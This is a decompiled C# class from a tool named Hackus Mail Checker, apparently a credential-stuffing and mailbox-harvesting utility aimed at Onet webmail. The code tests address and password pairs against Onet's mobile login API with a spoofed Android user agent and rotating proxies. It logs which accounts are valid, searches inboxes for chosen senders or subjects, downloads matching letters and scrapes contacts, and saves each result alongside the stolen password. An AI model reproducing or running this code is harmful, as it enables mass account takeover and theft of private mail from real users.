using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.Onet;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000A8 RID: 168
	public class OnetClientNew
	{
		// Token: 0x17000134 RID: 308
		// (get) Token: 0x0600055F RID: 1375 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000560 RID: 1376 RVA: 0x00009B95 File Offset: 0x00007D95
		public OnetClientNew(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x06000561 RID: 1377 RVA: 0x00020A44 File Offset: 0x0001EC44
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x06000562 RID: 1378 RVA: 0x00020AB8 File Offset: 0x0001ECB8
		public OperationResult Login()
		{
			OperationResult operationResult;
			do
			{
				this.Reset();
				operationResult = this.CreateSession();
			}
			while (operationResult == OperationResult.HttpError);
			return operationResult;
		}

		// Token: 0x06000563 RID: 1379 RVA: 0x00020AD8 File Offset: 0x0001ECD8
		private OperationResult CreateSession()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					string text = string.Concat(new string[]
					{
						"{\"id\":\"login_application\",\"jsonrpc\":\"2.0\",\"method\":\"login_application\",\"params\":{\"password\":\"",
						this._mailbox.Password,
						"\",\"client_id\":\"accountmanager.android.mobile-apps.onetapi.pl\",\"portal_id\":1,\"remember_me\":1,\"login\":\"",
						this._mailbox.Address,
						"\",\"grant_type\":\"password\"}}"
					});
					string text2 = httpRequest.Post("https://log-in.authorisation.onetapi.pl", text, "application/json").ToString();
					if (!text2.Contains("access_token"))
					{
						if (text2.ContainsIgnoreCase("invalid password"))
						{
							return OperationResult.Bad;
						}
					}
					else
					{
						Match match = Regex.Match(text2, "\"access_token\": \"(.+?)\"");
						if (match.Success)
						{
							this._accessToken = match.Groups[1].Value;
							return OperationResult.Ok;
						}
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000564 RID: 1380 RVA: 0x00020C10 File Offset: 0x0001EE10
		public void ProcessValid()
		{
			if (!this.SearchSettings.Search)
			{
				return;
			}
			if (this.GetSearchToken() == OperationResult.Ok)
			{
				OperationResult operationResult = OperationResult.Retry;
				int num = 0;
				bool flag = false;
				List<Request> list = new List<Request>();
				while (operationResult == OperationResult.Retry && num <= 2)
				{
					if (!flag && this.SearchSettings.Search)
					{
						operationResult = this.SearchMessages(list);
						if (operationResult == OperationResult.Ok)
						{
							flag = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult != OperationResult.Retry)
					{
						if (operationResult == OperationResult.Bad)
						{
							break;
						}
					}
					else if (ProxySettings.Instance.UseProxy)
					{
						this._proxyClient = ProxyManager.Instance.GetProxy();
					}
				}
				foreach (Request request in list)
				{
					int count = request.Count;
					if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
					{
						MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
						MailManager.Instance.AddResult(result);
						StatisticsManager.Instance.IncrementFound();
						FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
					}
				}
				return;
			}
		}

		// Token: 0x06000565 RID: 1381 RVA: 0x00020D58 File Offset: 0x0001EF58
		public OperationResult GetSearchToken()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddHeader("Authorization", "Bearer " + this._accessToken);
						string text = "{\"id\":\"access_token_refresh\",\"jsonrpc\":\"2.0\",\"method\":\"access_token_refresh\",\"params\":{\"master_app_id\":\"accountmanager.android.mobile-apps.onetapi.pl\",\"client_secret\":\"\",\"client_id\":\"mail.android.mobile-apps.onetapi.pl\",\"portal_id\":1}}";
						string text2 = httpRequest.Post("https://log-session.authorisation.onetapi.pl", text, "application/json").ToString();
						if (text2.Contains("access_token"))
						{
							Match match = Regex.Match(text2, "\"access_token\": \"(.+?)\"");
							if (match.Success)
							{
								this._accessToken = match.Groups[1].Value;
								this._cookies.Add("onet_token", this._accessToken);
								this._cookies.Add("X-Onet-App", "mail.android.mobile-apps.onetapi.pl");
								return OperationResult.Ok;
							}
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000566 RID: 1382 RVA: 0x00020EA8 File Offset: 0x0001F0A8
		private OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader("x-app-name", "1");
					httpRequest.AllowAutoRedirect = false;
					foreach (object obj in Regex.Matches(httpRequest.Get("https://api.kontakty.onet.pl/api/contacts", null).ToString(), "\"value\":\"(.+?)\""))
					{
						FileManager.SaveContact(((Match)obj).Groups[1].Value);
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Retry;
		}

		// Token: 0x06000567 RID: 1383 RVA: 0x00020FA0 File Offset: 0x0001F1A0
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => r.Sender == request.Sender && r.Body == request.Body && r.Subject == request.Subject);
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedUids != null && request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					if (request.Body == null && (request.Sender == null || request.Subject == null))
					{
						Request request2 = request3;
						if (!request2.FindedUids.Any<Uid>())
						{
							OperationResult operationResult = this.Search(request2);
							if (operationResult == OperationResult.Error)
							{
								request2.IsChecked = true;
								continue;
							}
							if (operationResult == OperationResult.HttpError)
							{
								return OperationResult.Retry;
							}
						}
						if (this.SearchSettings.DownloadLetters)
						{
							if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
							{
								request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
							}
							using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
							{
								while (enumerator2.MoveNext())
								{
									Uid uid = enumerator2.Current;
									if (!request3.SavedUids.Any((Uid u) => u == uid))
									{
										if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
										{
											break;
										}
										MailMessage message;
										OperationResult operationResult2 = this.FetchMessage(uid, out message);
										if (operationResult2 == OperationResult.Error)
										{
											request3.SavedUids.Add(uid);
										}
										else
										{
											if (operationResult2 == OperationResult.HttpError)
											{
												return OperationResult.Retry;
											}
											request3.SavedUids.Add(uid);
											FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
										}
									}
								}
								goto IL_244;
							}
							goto IL_238;
						}
						IL_244:
						request2.IsChecked = true;
						continue;
					}
					IL_238:
					request3.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000568 RID: 1384 RVA: 0x00021248 File Offset: 0x0001F448
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddUrlParam("sort", "date");
					httpRequest.AddUrlParam("sortDir", "desc");
					httpRequest.AddUrlParam("withLabels", 1);
					httpRequest.AddUrlParam("withTotalCount", 1);
					httpRequest.AddUrlParam("page", "1");
					httpRequest.AddUrlParam("limit", 100);
					httpRequest.AddUrlParam("searchQuery", (searchRequest.Sender == null) ? searchRequest.Subject : searchRequest.Sender);
					string text = httpRequest.Get("https://api.poczta.onet.pl/api/mail", null).ToString();
					SearchResponse searchResponse = null;
					try
					{
						searchResponse = JsonConvert.DeserializeObject<SearchResponse>(text);
					}
					catch
					{
					}
					if (((searchResponse != null) ? searchResponse.Mails : null) == null)
					{
						return OperationResult.Ok;
					}
					searchRequest.Count = searchResponse.Total_count;
					foreach (MidsResponse midsResponse in searchResponse.Mails)
					{
						if (searchRequest.Sender == null)
						{
							if (searchRequest.Subject != null && midsResponse.Subject.ContainsIgnoreCase(searchRequest.Subject))
							{
								searchRequest.FindedUids.Add(new Uid(midsResponse.Mid));
							}
						}
						else if (midsResponse.From.ContainsIgnoreCase(searchRequest.Sender))
						{
							searchRequest.FindedUids.Add(new Uid(midsResponse.Mid));
						}
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000569 RID: 1385 RVA: 0x000214A4 File Offset: 0x0001F6A4
		private OperationResult FetchMessage(Uid uid, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					string input = httpRequest.Get("https://api.poczta.onet.pl/api/mail/" + uid.UID.ToString(), null).ToString();
					Match match = Regex.Match(input, "\"subject\":(.+?),");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Subject = match.Groups[1].Value;
					match = Regex.Match(input, "\"received_date\":\"(.+?)\",");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Date = DateTime.Parse(match.Groups[1].Value);
					match = Regex.Match(input, "\"html\":\"(.+?)\",\".+?\":");
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment("text/html", match.Groups[1].Value));
					match = Regex.Match(input, "\"email\":\"(.+?)\"");
					if (match.Success)
					{
						message.From = match.Groups[1].Value;
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600056A RID: 1386 RVA: 0x00009BA4 File Offset: 0x00007DA4
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x0600056B RID: 1387 RVA: 0x0002165C File Offset: 0x0001F85C
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1.1; G011A Build/LMY48Z) Mobile DreamLab pl.onet.mail/1.3.958";
			request.AddHeader("X-Onet-App", "accountmanager.android.mobile-apps.onetapi.pl");
		}

		// Token: 0x0600056C RID: 1388 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002D6 RID: 726
		private Mailbox _mailbox;

		// Token: 0x040002D7 RID: 727
		private ProxyClient _proxyClient;

		// Token: 0x040002D8 RID: 728
		private CookieDictionary _cookies;

		// Token: 0x040002D9 RID: 729
		private string _accessToken;
	}
}
